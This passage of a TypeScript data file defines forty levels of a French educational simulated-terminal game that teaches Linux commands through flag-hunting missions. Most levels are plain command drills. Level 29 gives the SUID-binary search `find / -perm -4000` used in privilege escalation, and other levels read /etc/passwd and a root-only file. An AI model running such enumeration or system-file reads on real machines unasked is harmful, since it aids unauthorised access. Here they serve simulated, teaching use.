export interface Level {
  id: number;
  title: string;
  difficulty: 'beginner' | 'intermediate' | 'advanced';
  category: string;
  objective: string;
  description: string;
  commands: string[];
  hints: string[];
  fileSystem: FileSystemStructure;
  validation: ValidationRule[];
  story?: string;
}

export interface FileSystemStructure {
  [key: string]: string | FileSystemStructure;
}

export interface ValidationRule {
  type: 'command' | 'output' | 'fileContent' | 'fileExists';
  value: string;
  description?: string;
}

export const levels: Level[] = [
  // 🟢 Niveaux 1-10 : Bases Terminal & SSH
  {
    id: 1,
    title: "Découvrir le terminal",
    difficulty: 'beginner',
    category: "Bases",
    objective: "Utiliser la commande echo pour afficher un message",
    description: "Le terminal est ton nouvel outil. Commence par dire bonjour ! Tape la commande `echo` suivie de ton message.",
    commands: ['echo'],
    hints: [
      "Essaie : echo Hello",
      "Le terminal affiche exactement ce que tu lui dis d'afficher"
    ],
    fileSystem: {},
    validation: [
      { type: 'command', value: 'echo', description: 'Utiliser la commande echo' }
    ],
    story: "🎮 Bienvenue dans EduLinux ! Tu es un nouvel administrateur système. Ta première mission : communiquer avec la machine."
  },
  {
    id: 2,
    title: "Lister les fichiers",
    difficulty: 'beginner',
    category: "Bases",
    objective: "Découvrir les fichiers avec ls",
    description: "Chaque dossier contient des fichiers. Utilise `ls` pour voir ce qui se trouve ici.",
    commands: ['ls'],
    hints: [
      "Tape simplement : ls",
      "Tu verras la liste des fichiers du dossier actuel"
    ],
    fileSystem: {
      'welcome.txt': 'Bienvenue dans le système !',
      'password.txt': 'Le mot de passe est : NEXT_LEVEL',
      'info.txt': 'Ce fichier contient des informations'
    },
    validation: [
      { type: 'command', value: 'ls', description: 'Lister les fichiers' }
    ],
    story: "📁 Tu es dans un nouveau dossier. Que contient-il ? Utilise tes yeux de terminal !"
  },
  {
    id: 3,
    title: "Se déplacer",
    difficulty: 'beginner',
    category: "Navigation",
    objective: "Naviguer avec cd et pwd",
    description: "Le terminal a toujours une position. `pwd` te montre où tu es, `cd` te permet de te déplacer.",
    commands: ['cd', 'pwd'],
    hints: [
      "pwd = Print Working Directory",
      "cd documents pour aller dans le dossier documents",
      "Utilise ls pour voir les dossiers disponibles"
    ],
    fileSystem: {
      'documents': {
        'secret.txt': 'FLAG: EXPLORER_2024'
      },
      'images': {},
      'here.txt': 'Tu dois aller dans documents/'
    },
    validation: [
      { type: 'command', value: 'cd documents', description: 'Aller dans le dossier documents' }
    ],
    story: "🗺️ Le fichier secret est caché dans un sous-dossier. À toi de le trouver !"
  },
  {
    id: 4,
    title: "Lire des fichiers",
    difficulty: 'beginner',
    category: "Lecture",
    objective: "Afficher le contenu avec cat",
    description: "Pour lire un fichier, utilise `cat nom_fichier`. C'est comme l'ouvrir dans un éditeur.",
    commands: ['cat', 'less'],
    hints: [
      "cat password.txt pour lire le fichier",
      "less est utile pour les gros fichiers"
    ],
    fileSystem: {
      'password.txt': 'Le mot de passe secret est : TERMINAL_MASTER',
      'readme.txt': 'Lis le fichier password.txt pour continuer'
    },
    validation: [
      { type: 'command', value: 'cat password.txt', description: 'Lire le fichier password.txt' }
    ],
    story: "📖 Un fichier contient le mot de passe. Ouvre-le !"
  },
  {
    id: 5,
    title: "Navigation profonde",
    difficulty: 'beginner',
    category: "Navigation",
    objective: "Maîtriser cd .. et l'arborescence",
    description: "Navigue dans une arborescence complexe. `cd ..` remonte d'un niveau.",
    commands: ['cd', 'pwd', 'ls'],
    hints: [
      "cd .. pour remonter",
      "cd nom_dossier pour descendre",
      "pwd pour savoir où tu es"
    ],
    fileSystem: {
      'home': {
        'user': {
          'documents': {
            'work': {
              'flag.txt': 'CONGRATULATIONS: DEEP_EXPLORER'
            }
          }
        }
      }
    },
    validation: [
      { type: 'command', value: 'cd work', description: 'Atteindre le dossier work' }
    ],
    story: "🏔️ Le trésor est au fond de l'arborescence. Descends jusqu'au bout !"
  },
  {
    id: 6,
    title: "Permissions basiques",
    difficulty: 'beginner',
    category: "Permissions",
    objective: "Comprendre chmod",
    description: "Les fichiers ont des permissions. `chmod +r` ajoute la permission de lecture.",
    commands: ['chmod', 'cat'],
    hints: [
      "chmod +r fichier.txt pour rendre lisible",
      "Ensuite utilise cat pour lire"
    ],
    fileSystem: {
      'locked.txt': '[PERMISSION_DENIED] Contenu : PASSWORD_IS_CHMOD_MASTER'
    },
    validation: [
      { type: 'command', value: 'chmod +r locked.txt', description: 'Rendre le fichier lisible' }
    ],
    story: "🔒 Un fichier est verrouillé. Change ses permissions pour le lire !"
  },
  {
    id: 7,
    title: "Recherche dans fichier",
    difficulty: 'beginner',
    category: "Recherche",
    objective: "Utiliser grep pour chercher",
    description: "`grep` cherche du texte dans un fichier. Syntaxe : `grep 'mot' fichier.txt`",
    commands: ['grep', 'cat'],
    hints: [
      "grep 'password' fichier.txt",
      "grep trouve les lignes contenant le mot"
    ],
    fileSystem: {
      'log.txt': `Ligne 1: information système
Ligne 2: erreur de connexion
Ligne 3: password: GREP_WARRIOR_2024
Ligne 4: fin du log
Ligne 5: données diverses`
    },
    validation: [
      { type: 'command', value: 'grep password log.txt', description: 'Chercher "password" dans log.txt' }
    ],
    story: "🔍 Un énorme fichier log contient le mot de passe quelque part. Trouve-le avec grep !"
  },
  {
    id: 8,
    title: "Recherche de fichier",
    difficulty: 'beginner',
    category: "Recherche",
    objective: "Utiliser find pour localiser des fichiers",
    description: "`find` cherche des fichiers par nom. Syntaxe : `find . -name 'fichier.txt'`",
    commands: ['find', 'cat'],
    hints: [
      "find . -name 'secret.txt'",
      "Le point . signifie 'ici'"
    ],
    fileSystem: {
      'folder1': {
        'data.txt': 'Rien ici'
      },
      'folder2': {
        'subfolder': {
          'secret.txt': 'FLAG: FIND_MASTER_007'
        }
      },
      'folder3': {}
    },
    validation: [
      { type: 'command', value: 'find . -name secret.txt', description: 'Trouver le fichier secret.txt' }
    ],
    story: "📂 Le fichier secret.txt est caché quelque part dans l'arborescence. Find it!"
  },
  {
    id: 9,
    title: "Décodage simple",
    difficulty: 'beginner',
    category: "Encodage",
    objective: "Décoder un message en base64",
    description: "Le base64 est un encodage (pas du chiffrement). Dans ce simulateur, tu peux décoder de deux façons : `cat encoded.txt | base64 -d` **ou** `base64 -d encoded.txt`. Les deux affichent le texte clair.",
    commands: ['base64', 'cat'],
    hints: [
      "Commence par `cat encoded.txt` pour voir la chaîne encodée.",
      "Pour décoder : `cat encoded.txt | base64 -d` (recommandé) ou `base64 -d encoded.txt`.",
      "La validation vérifie que tu utilises bien `base64 -d` pour obtenir le message."
    ],
    fileSystem: {
      'encoded.txt': 'VEVSTUlOQUxfREVDT0RFUl8yMDI0',
      'info.txt': 'Le fichier encoded.txt contient un message secret encodé en base64. Décode-le pour découvrir le mot de passe !'
    },
    validation: [
      { type: 'command', value: 'base64 -d', description: 'Décoder avec base64 -d (pipe ou fichier)' }
    ],
    story: "🔐 Un message secret est encodé en base64 dans encoded.txt. Décode-le pour révéler le mot de passe caché."
  },
  {
    id: 10,
    title: "SSH - Connexion distante",
    difficulty: 'beginner',
    category: "SSH",
    objective: "Se connecter à un serveur distant avec SSH",
    description: "Un serveur distant t'attend. Trouve les informations de connexion et utilise la syntaxe SSH : `ssh user@host -p port`",
    commands: ['ssh', 'cat'],
    hints: [
      "Lis le fichier instructions.txt pour trouver les informations",
      "Syntaxe SSH : ssh utilisateur@serveur -p numero_port",
      "L'utilisateur, le serveur et le port sont dans instructions.txt"
    ],
    fileSystem: {
      'instructions.txt': `🔐 Informations de connexion SSH

Pour te connecter au serveur de backup :
- Utilisateur : admin
- Serveur : backup.edulinux.local
- Port : 2222

⚠️ Attention : utilise le bon port, pas le port par défaut (22) !`
    },
    validation: [
      { type: 'command', value: 'ssh admin@backup.edulinux.local -p 2222', description: 'Se connecter en SSH avec les bonnes informations' }
    ],
    story: "🌐 Un serveur de backup distant contient des données importantes. Tu dois t'y connecter, mais les informations de connexion sont dans un fichier. Trouve-les et connecte-toi !"
  },

  // 🟡 Niveaux 11-20 : Manipulation & Automatisation
  {
    id: 11,
    title: "Redirections & Pipes",
    difficulty: 'intermediate',
    category: "Flux",
    objective: "Rediriger avec > puis enchaîner avec |",
    description: "Ce niveau comporte **deux objectifs séparés** (tu peux utiliser deux commandes, une après l'autre) : (1) écrire du texte dans un fichier avec `echo ... > fichier` ; (2) utiliser le pipe `|` pour envoyer la sortie d'une commande à une autre (ex. `cat fichier | grep mot`).",
    commands: ['echo', 'grep', 'cat'],
    hints: [
      "Étape A — redirection : `echo 'texte' > essai.txt` (le `>` crée ou écrase le fichier).",
      "Étape B — pipe : `cat essai.txt | grep texte` (ou toute commande qui contient `|`).",
      "Chaque étape déclenche une validation quand tu valides la commande avec Entrée."
    ],
    fileSystem: {},
    validation: [
      { type: 'command', value: 'echo >', description: 'Rediriger la sortie de echo avec >' },
      { type: 'command', value: '|', description: 'Enchaîner deux commandes avec le pipe |' }
    ],
    story: "🔀 Les flux de données : d'abord écrire dans un fichier, puis relier deux commandes. Prends le temps de faire les deux manipulations."
  },
  {
    id: 12,
    title: "Append vs Overwrite",
    difficulty: 'intermediate',
    category: "Flux",
    objective: "Différence entre > et >>",
    description: "`>` écrase le fichier, `>>` ajoute à la fin.",
    commands: ['echo'],
    hints: [
      "echo 'ligne1' > log.txt (écrase)",
      "echo 'ligne2' >> log.txt (ajoute)"
    ],
    fileSystem: {
      'journal.log': 'Entrée initiale'
    },
    validation: [
      { type: 'command', value: '>>', description: 'Utiliser >> pour ajouter' }
    ],
    story: "📝 Un journal doit garder toutes ses entrées. N'écrase pas l'historique !"
  },
  {
    id: 13,
    title: "Analyse de texte",
    difficulty: 'intermediate',
    category: "Analyse",
    objective: "Utiliser wc, sort, uniq",
    description: "`wc -l` compte les lignes, `sort` trie, `uniq` élimine les doublons.",
    commands: ['wc', 'sort', 'uniq'],
    hints: [
      "wc -l fichier.txt compte les lignes",
      "cat fichier | sort | uniq supprime les doublons"
    ],
    fileSystem: {
      'data.txt': `apple
banana
apple
cherry
banana
apple`
    },
    validation: [
      { type: 'command', value: 'wc -l data.txt', description: 'Compter les lignes' }
    ],
    story: "📊 Analyse des données : combien de lignes ? Combien de valeurs uniques ?"
  },
  {
    id: 14,
    title: "Wildcards (*, ?)",
    difficulty: 'intermediate',
    category: "Glob",
    objective: "Utiliser les patterns glob",
    description: "`*` remplace n'importe quoi, `?` remplace un caractère.",
    commands: ['ls'],
    hints: [
      "ls *.txt pour tous les .txt",
      "ls file?.txt pour file1.txt, file2.txt, etc."
    ],
    fileSystem: {
      'report1.txt': 'Rapport 1',
      'report2.txt': 'Rapport 2',
      'report3.txt': 'Rapport 3',
      'data.csv': 'Données',
      'secret_flag.txt': 'FLAG: GLOB_MASTER'
    },
    validation: [
      { type: 'command', value: 'ls *.txt', description: 'Lister tous les fichiers .txt' }
    ],
    story: "🌟 Des dizaines de fichiers. Liste seulement les .txt avec un pattern !"
  },
  {
    id: 15,
    title: "Permissions avancées",
    difficulty: 'intermediate',
    category: "Permissions",
    objective: "Comprendre rwx et chmod +x",
    description: "`r`=read, `w`=write, `x`=execute. `chmod +x` rend exécutable.",
    commands: ['chmod', 'ls'],
    hints: [
      "chmod +x script.sh",
      "ls -l pour voir les permissions"
    ],
    fileSystem: {
      'script.sh': '#!/bin/bash\necho "FLAG: EXECUTABLE_UNLOCKED"'
    },
    validation: [
      { type: 'command', value: 'chmod +x script.sh', description: 'Rendre script.sh exécutable' }
    ],
    story: "⚙️ Un script ne peut pas s'exécuter sans permission. Débloque-le !"
  },
  {
    id: 16,
    title: "Variables d'environnement",
    difficulty: 'intermediate',
    category: "Environnement",
    objective: "Utiliser export et $",
    description: "Les variables stockent des données. `export VAR='valeur'` et `echo $VAR`.",
    commands: ['export', 'echo'],
    hints: [
      "export FLAG='success'",
      "echo $FLAG pour afficher"
    ],
    fileSystem: {},
    validation: [
      { type: 'command', value: 'export FLAG=', description: 'Créer la variable FLAG' }
    ],
    story: "🎯 Le système utilise des variables. Crée FLAG='success' et affiche-la !"
  },
  {
    id: 17,
    title: "Premier script Bash",
    difficulty: 'intermediate',
    category: "Scripts",
    objective: "Créer hello.sh et l'exécuter avec ./hello.sh",
    description: "Un script est un fichier de commandes. Parcours typique : créer `hello.sh` (avec `echo` et des lignes commençant par `#!/bin/bash`), le rendre exécutable avec `chmod +x hello.sh`, puis lancer **`./hello.sh`**. Dans EduLinux, **c'est la commande `./hello.sh` qui valide le niveau** — les étapes précédentes t'apprennent le chemin complet qu'on suivrait sur un vrai système.",
    commands: ['echo', 'chmod'],
    hints: [
      "Création (exemple) : `echo '#!/bin/bash' > hello.sh` puis ajoute une ligne `echo Hello` (tu peux refaire echo avec `>>` si besoin).",
      "Rends le fichier exécutable : `chmod +x hello.sh`.",
      "Validation du niveau : tape `./hello.sh` et valide avec Entrée."
    ],
    fileSystem: {},
    validation: [
      { type: 'command', value: './hello.sh', description: 'Exécuter le script ./hello.sh' }
    ],
    story: "📜 Écris un petit script, rends-le exécutable, puis lance-le : c'est le geste quotidien de l'administration système."
  },
  {
    id: 18,
    title: "Chaîne de pipes",
    difficulty: 'intermediate',
    category: "Flux",
    objective: "Combiner grep et cut",
    description: "`cut` découpe par délimiteur. `cut -d':' -f2` prend le 2e champ.",
    commands: ['grep', 'cut', 'cat'],
    hints: [
      "cat users.txt | grep 'admin' trouve la ligne",
      "| cut -d':' -f2 extrait le champ"
    ],
    fileSystem: {
      'users.txt': `user:john:1001
admin:FLAG_PIPELINE_MASTER:1002
guest:visitor:1003`
    },
    validation: [
      { type: 'command', value: "grep admin users.txt | cut -d':' -f2", description: 'Extraire le mot de passe admin' }
    ],
    story: "🔗 Les vraies données nécessitent plusieurs étapes. Enchaîne les commandes !"
  },
  {
    id: 19,
    title: "Compression",
    difficulty: 'intermediate',
    category: "Archives",
    objective: "Extraire avec tar et gzip",
    description: "`tar -xvf fichier.tar` extrait une archive.",
    commands: ['tar', 'unzip', 'cat'],
    hints: [
      "tar -xvf archive.tar.gz",
      "Le fichier sera extrait dans le dossier"
    ],
    fileSystem: {
      'archive.tar.gz': '[ARCHIVE_CONTAINS: password.txt]'
    },
    validation: [
      { type: 'command', value: 'tar -xvf archive.tar.gz', description: 'Extraire l\'archive' }
    ],
    story: "📦 Le mot de passe est dans une archive compressée. Extrais-la !"
  },
  {
    id: 20,
    title: "Curl/Wget",
    difficulty: 'intermediate',
    category: "Réseau",
    objective: "Télécharger une ressource web",
    description: "`curl URL -o fichier` télécharge une page web.",
    commands: ['curl', 'wget', 'cat'],
    hints: [
      "curl https://example.com -o page.html",
      "cat page.html pour lire"
    ],
    fileSystem: {},
    validation: [
      { type: 'command', value: 'curl', description: 'Utiliser curl pour télécharger' }
    ],
    story: "🌐 Le serveur distant contient un fichier avec le mot de passe. Télécharge-le !"
  },

  // 🔴 Niveaux 21-30 : Réseau, crypto, scripts avancés
  {
    id: 21,
    title: "Ports et scan",
    difficulty: 'advanced',
    category: "Réseau",
    objective: "Comprendre les ports",
    description: "Les services utilisent des ports. Simule un scan pour trouver les ports ouverts.",
    commands: ['scan'],
    hints: [
      "scan 192.168.1.10",
      "Les ports ouverts révèlent les services"
    ],
    fileSystem: {},
    validation: [
      { type: 'command', value: 'scan', description: 'Scanner une adresse IP' }
    ],
    story: "🛰️ Un serveur inconnu. Scanne-le pour découvrir ses services actifs !"
  },
  {
    id: 22,
    title: "Sudo & privilèges",
    difficulty: 'advanced',
    category: "Permissions",
    objective: "Utiliser sudo",
    description: "`sudo` exécute avec privilèges administrateur. Certains fichiers sont protégés.",
    commands: ['sudo', 'cat'],
    hints: [
      "sudo cat /root/secret.txt",
      "Certaines actions nécessitent sudo"
    ],
    fileSystem: {
      '/root/secret.txt': '[REQUIRES_SUDO] FLAG: SUPERUSER_ACCESS'
    },
    validation: [
      { type: 'command', value: 'sudo cat /root/secret.txt', description: 'Lire avec sudo' }
    ],
    story: "👑 Seul le superutilisateur peut lire ce fichier. Deviens root !"
  },
  {
    id: 23,
    title: "Clés SSH",
    difficulty: 'advanced',
    category: "SSH",
    objective: "Générer une clé SSH",
    description: "`ssh-keygen` crée une paire de clés publique/privée pour l'authentification.",
    commands: ['ssh-keygen'],
    hints: [
      "ssh-keygen -t rsa",
      "La clé publique va dans authorized_keys"
    ],
    fileSystem: {},
    validation: [
      { type: 'command', value: 'ssh-keygen', description: 'Générer une clé SSH' }
    ],
    story: "🔑 L'authentification par mot de passe est faible. Génère une clé SSH !"
  },
  {
    id: 24,
    title: "Hashing",
    difficulty: 'advanced',
    category: "Cryptographie",
    objective: "Comprendre les hash",
    description: "Un hash transforme du texte en empreinte unique. `md5`, `sha256`.",
    commands: ['md5', 'sha256sum'],
    hints: [
      "echo -n 'hello' | md5",
      "Les hash sont à sens unique (pas de décodage)"
    ],
    fileSystem: {
      'hashes.txt': `Trouve le mot dont le MD5 est:
5d41402abc4b2a76b9719d911017c592`
    },
    validation: [
      { type: 'command', value: 'md5', description: 'Calculer un hash MD5' }
    ],
    story: "🧩 Un hash mystérieux. Trouve le mot original (indice : c'est 'hello') !"
  },
  {
    id: 25,
    title: "Sed - Substitution",
    difficulty: 'advanced',
    category: "Édition",
    objective: "Modifier du texte avec sed",
    description: "`sed 's/ancien/nouveau/g'` remplace du texte.",
    commands: ['sed'],
    hints: [
      "sed 's/password/*****/g' note.txt",
      "Le 'g' remplace toutes les occurrences"
    ],
    fileSystem: {
      'config.txt': `server=localhost
password=SECRET_PASS_123
port=8080`
    },
    validation: [
      { type: 'command', value: 'sed', description: 'Utiliser sed pour remplacer' }
    ],
    story: "✏️ Masque tous les mots de passe dans le fichier de configuration !"
  },
  {
    id: 26,
    title: "Regex",
    difficulty: 'advanced',
    category: "Patterns",
    objective: "Expressions régulières",
    description: "`grep -E` utilise les regex. `flag{.*}` trouve n'importe quel flag.",
    commands: ['grep'],
    hints: [
      "grep -E 'flag\\{.*\\}' fichier.txt",
      "Les regex sont puissantes pour chercher des patterns"
    ],
    fileSystem: {
      'data.txt': `Ligne normale
Autre ligne
flag{REGEX_CHAMPION_2024}
Encore du texte
flag{fake_flag}
Fin du fichier`
    },
    validation: [
      { type: 'command', value: 'grep -E', description: 'Utiliser grep avec regex' }
    ],
    story: "🎯 Des centaines de lignes, mais un seul vrai flag. Trouve-le avec regex !"
  },
  {
    id: 27,
    title: "Processus",
    difficulty: 'advanced',
    category: "Système",
    objective: "Gérer les processus",
    description: "`ps` liste les processus, `kill` les arrête.",
    commands: ['ps', 'kill'],
    hints: [
      "ps aux | grep malicious",
      "kill <PID> pour tuer le processus"
    ],
    fileSystem: {},
    validation: [
      { type: 'command', value: 'ps', description: 'Lister les processus' }
    ],
    story: "🔍 Un processus suspect consomme des ressources. Identifie-le et arrête-le !"
  },
  {
    id: 28,
    title: "SCP - Copie distante",
    difficulty: 'advanced',
    category: "Réseau",
    objective: "Transférer des fichiers",
    description: "`scp fichier user@host:/path` copie vers un serveur distant.",
    commands: ['scp'],
    hints: [
      "scp local.txt user@server:/remote/",
      "SCP utilise SSH pour la sécurité"
    ],
    fileSystem: {
      'important.txt': 'FLAG: FILE_TRANSFER_MASTER'
    },
    validation: [
      { type: 'command', value: 'scp important.txt', description: 'Utiliser scp pour transférer' }
    ],
    story: "📡 Tu dois envoyer un fichier au serveur de backup. Utilise SCP !"
  },
  {
    id: 29,
    title: "SUID Exploit",
    difficulty: 'advanced',
    category: "Sécurité",
    objective: "Comprendre l'exécution avec bit SUID (simulation)",
    description: "Sur Linux, un exécutable **SUID** tourne avec l'identité du propriétaire du fichier (souvent root), ce qui peut exposer des données sensibles si le programme est mal conçu. **Ici le scénario est pédagogique et simplifié** : un programme `secret_reader` est dans ton répertoire courant ; lance-le avec **`./secret_reader`** pour voir la sortie simulée. Sur une machine réelle, on repère souvent les SUID avec `find / -perm -4000 2>/dev/null` — à étudier sur un lab isolé.",
    commands: ['ls', 'find'],
    hints: [
      "Concept : `chmod u+s fichier` (ou SUID posé par l'admin) — le processus hérite des droits du propriétaire.",
      "Dans cet exercice, pas besoin de parcourir tout le disque : le binaire s'appelle `secret_reader` et se lance avec `./secret_reader`.",
      "Sur un vrai système, `find / -perm -4000` liste les binaires SUID (bruit abondant ; droits admin requis pour analyser)."
    ],
    fileSystem: {
      'secret_reader': '[SUID root — simulation] Lecture de données protégées si appelé correctement'
    },
    validation: [
      { type: 'command', value: './secret_reader', description: 'Exécuter ./secret_reader (comportement SUID simulé)' }
    ],
    story: "🔓 Un exécutable à privilèges élevés est modélisé ici par `secret_reader`. Comprends le risque avant d'exploiter quoi que ce soit hors cadre légal."
  },
  {
    id: 30,
    title: "Mission Finale",
    difficulty: 'advanced',
    category: "CTF",
    objective: "Assembler toutes tes compétences",
    description: "Une mission complète : scan, téléchargement, extraction, décodage, script.",
    commands: ['scan', 'wget', 'tar', 'base64', 'chmod'],
    hints: [
      "1. Scanne le réseau",
      "2. Télécharge l'archive",
      "3. Extrais-la",
      "4. Trouve le dossier caché",
      "5. Décode le message",
      "6. Exécute le script final"
    ],
    fileSystem: {},
    validation: [
      { type: 'command', value: 'scan target', description: 'Scanner la cible' },
      { type: 'command', value: 'wget', description: 'Télécharger le fichier' },
      { type: 'command', value: 'tar -xvf', description: 'Extraire l\'archive' },
      { type: 'command', value: 'base64 -d', description: 'Décoder le message' },
      { type: 'command', value: './unlock.sh', description: 'Exécuter le script final' }
    ],
    story: "🏆 MISSION FINALE : Un serveur compromis contient des données sensibles. Récupère-les en suivant tous les indices. Bonne chance, Terminal Warrior !"
  },

  // ⚙️ Niveaux 31-40 : Système Linux
  {
    id: 31,
    title: "Espace disque",
    difficulty: 'intermediate',
    category: "Système",
    objective: "Analyser l'occupation disque avec df et du",
    description: "`df -h` montre l'espace libre par partition. `du -sh dossier` calcule la taille d'un dossier. Le `-h` signifie *human-readable* (Ko/Mo/Go).",
    commands: ['df', 'du'],
    hints: [
      "Tape `df -h` pour voir toutes les partitions et leur taux d'occupation.",
      "Tape `du -sh /var/log` pour voir la taille du dossier logs simulé.",
      "Les deux commandes valident cet exercice, dans n'importe quel ordre."
    ],
    fileSystem: {
      'var': {
        'log': {
          'syslog': '... 420 Mo de journaux système ...',
          'auth.log': '... 12 Mo ...'
        }
      }
    },
    validation: [
      { type: 'command', value: 'df -h', description: 'Afficher l\'espace disque des partitions' },
      { type: 'command', value: 'du -sh', description: 'Calculer la taille d\'un dossier' }
    ],
    story: "💾 Le serveur semble lent. La première chose à vérifier : est-ce que le disque est plein ?"
  },
  {
    id: 32,
    title: "Journaux système",
    difficulty: 'intermediate',
    category: "Système",
    objective: "Lire les logs avec journalctl",
    description: "`journalctl` affiche les journaux `systemd`. Options utiles : `-n 20` (20 dernières lignes), `-u service` (logs d'un service), `--since '1 hour ago'`.",
    commands: ['journalctl'],
    hints: [
      "`journalctl -n 20` — les 20 dernières entrées.",
      "`journalctl -u ssh` — logs du service SSH uniquement.",
      "Dans ce simulateur, `journalctl` affiche des logs fictifs réalistes."
    ],
    fileSystem: {},
    validation: [
      { type: 'command', value: 'journalctl -n', description: 'Lire les N derniers logs système' }
    ],
    story: "📋 Une anomalie s'est produite cette nuit. Ouvre les journaux système pour trouver un indice sur l'heure et le service impliqué."
  },
  {
    id: 33,
    title: "Tâches planifiées",
    difficulty: 'intermediate',
    category: "Système",
    objective: "Lire et comprendre crontab",
    description: "`crontab -l` liste les tâches planifiées de l'utilisateur. Le format est : `minute heure jour mois jourSemaine commande`. Exemple : `0 2 * * * /bin/backup.sh` = tous les jours à 2h.",
    commands: ['crontab'],
    hints: [
      "`crontab -l` pour lister les tâches planifiées.",
      "Le fichier `cron_example.txt` explique le format des cinq champs.",
      "Repère la tâche qui s'exécute chaque heure (champ minutes = 0, heure = *)."
    ],
    fileSystem: {
      'cron_example.txt': `# Format : min heure jour mois jourSemaine commande
# Chaque champ : * = toujours / valeur = exactement ce moment
0 * * * * /usr/bin/check_disk.sh       # toutes les heures
30 2 * * 0 /opt/backup/full_backup.sh  # dimanche à 2h30
*/5 * * * * /usr/bin/monitor_cpu.sh    # toutes les 5 minutes
0 0 1 * * /usr/bin/monthly_report.sh   # 1er du mois à minuit`
    },
    validation: [
      { type: 'command', value: 'crontab -l', description: 'Lister les tâches planifiées' }
    ],
    story: "⏰ Un rapport mensuel n'arrive plus. Quelqu'un a-t-il modifié le crontab ? Inspecte-le."
  },
  {
    id: 34,
    title: "Services systemd",
    difficulty: 'intermediate',
    category: "Système",
    objective: "Inspecter un service avec systemctl",
    description: "`systemctl status service` affiche l'état d'un service (actif/inactif, PID, logs récents). `systemctl list-units --type=service` liste tous les services.",
    commands: ['systemctl'],
    hints: [
      "`systemctl status ssh` — état du service SSH.",
      "`systemctl list-units --type=service --state=running` — services actifs uniquement.",
      "Repère si le service `nginx` est bien actif (active/running)."
    ],
    fileSystem: {},
    validation: [
      { type: 'command', value: 'systemctl status', description: 'Vérifier l\'état d\'un service' }
    ],
    story: "🔧 Le site web ne répond plus. Le service nginx est-il en cours d'exécution ?"
  },
  {
    id: 35,
    title: "Utilisateurs et groupes",
    difficulty: 'intermediate',
    category: "Système",
    objective: "Lire /etc/passwd et id",
    description: "`cat /etc/passwd` liste les comptes. `id utilisateur` affiche UID, GID et groupes. `groups` liste les groupes de l'utilisateur courant.",
    commands: ['id', 'groups', 'cat'],
    hints: [
      "`cat /etc/passwd` — format : `login:x:UID:GID:info:home:shell`.",
      "`id www-data` — affiche l'identité du compte web.",
      "`groups` sans argument : tes propres groupes."
    ],
    fileSystem: {
      'etc': {
        'passwd': `root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
student:x:1001:1001:Étudiant EduLinux:/home/student:/bin/bash`,
        'group': `root:x:0:
sudo:x:27:student
www-data:x:33:
student:x:1001:`
      }
    },
    validation: [
      { type: 'command', value: 'id', description: 'Afficher l\'identité d\'un utilisateur' }
    ],
    story: "👤 Un compte inconnu apparaît dans les logs. Qui est `www-data` et dans quels groupes est-il ?"
  },
  {
    id: 36,
    title: "Permissions avancées : umask",
    difficulty: 'advanced',
    category: "Système",
    objective: "Comprendre umask et les droits par défaut",
    description: "`umask` définit les droits **enlevés** par défaut lors de la création d'un fichier. Un `umask 022` soustrait écriture groupe+autres → fichiers créés en `644`, dossiers en `755`.",
    commands: ['umask', 'ls'],
    hints: [
      "`umask` sans argument affiche la valeur actuelle.",
      "Fichier avec umask 022 : droits = 666 - 022 = 644 (rw-r--r--).",
      "Dossier avec umask 022 : droits = 777 - 022 = 755 (rwxr-xr-x)."
    ],
    fileSystem: {
      'umask_explique.txt': `umask 022 → fichier par défaut : 644, dossier : 755
umask 077 → fichier par défaut : 600, dossier : 700 (privé)
umask 002 → fichier par défaut : 664, dossier : 775 (partage groupe)

Pour changer temporairement : umask 027
Pour vérifier : umask`
    },
    validation: [
      { type: 'command', value: 'umask', description: 'Afficher ou modifier le umask' }
    ],
    story: "🔐 Un script crée des fichiers sensibles lisibles par tout le monde. Le umask est-il configuré correctement ?"
  },
  {
    id: 37,
    title: "Surveillance en temps réel",
    difficulty: 'advanced',
    category: "Système",
    objective: "Utiliser top et free",
    description: "`top` affiche les processus consommateurs de CPU en temps réel. `free -h` affiche la RAM disponible. Dans ce simulateur, ces commandes donnent un snapshot statique.",
    commands: ['top', 'free'],
    hints: [
      "`top` — liste les processus triés par CPU (q pour quitter sur un vrai système).",
      "`free -h` — mémoire RAM totale, utilisée, libre, cache.",
      "Repère le processus qui consomme le plus de CPU dans la sortie de top."
    ],
    fileSystem: {},
    validation: [
      { type: 'command', value: 'free -h', description: 'Afficher la mémoire disponible' },
      { type: 'command', value: 'top', description: 'Afficher les processus actifs' }
    ],
    story: "🔥 Le serveur est lent. CPU ? RAM ? Lance les outils d'observation pour comprendre."
  },
  {
    id: 38,
    title: "Variables et environnement système",
    difficulty: 'intermediate',
    category: "Système",
    objective: "Explorer l'environnement avec env et printenv",
    description: "`env` liste toutes les variables d'environnement. `printenv NOM` affiche la valeur d'une variable précise. `echo $PATH` montre les chemins de recherche des commandes.",
    commands: ['env', 'printenv', 'echo'],
    hints: [
      "`env` — affiche toutes les variables (USER, HOME, PATH, etc.).",
      "`printenv PATH` — valeur de PATH uniquement.",
      "`echo $HOME` — répertoire personnel de l'utilisateur courant."
    ],
    fileSystem: {},
    validation: [
      { type: 'command', value: 'env', description: 'Lister toutes les variables d\'environnement' },
      { type: 'command', value: 'printenv', description: 'Afficher une variable précise' }
    ],
    story: "🎛️ Un script plante car il ne trouve pas une commande. Le PATH est-il bien configuré ?"
  },
  {
    id: 39,
    title: "Liens symboliques",
    difficulty: 'intermediate',
    category: "Système",
    objective: "Créer et lire un lien symbolique avec ln -s",
    description: "Un lien symbolique (`ln -s cible nom_lien`) est un raccourci vers un fichier. `ls -la` affiche la cible avec `->`. Utile pour éviter les copies.",
    commands: ['ln', 'ls'],
    hints: [
      "`ln -s /var/log/syslog mon_log` crée un lien vers syslog.",
      "`ls -la` pour voir la cible du lien (-> chemin).",
      "`readlink mon_log` affiche le chemin réel ciblé."
    ],
    fileSystem: {
      'var': {
        'log': {
          'syslog': 'Jan 15 02:41:55 server kernel: [12345.678] system event'
        }
      },
      'README.txt': 'Crée un lien symbolique appelé "log_rapide" pointant vers /var/log/syslog'
    },
    validation: [
      { type: 'command', value: 'ln -s', description: 'Créer un lien symbolique' }
    ],
    story: "🔗 Le script d'analyse lit toujours le même chemin court. Configure un lien symbolique pour pointer vers le log du jour."
  },
  {
    id: 40,
    title: "Archiver et transférer",
    difficulty: 'intermediate',
    category: "Système",
    objective: "Créer une archive tar et la transférer avec scp",
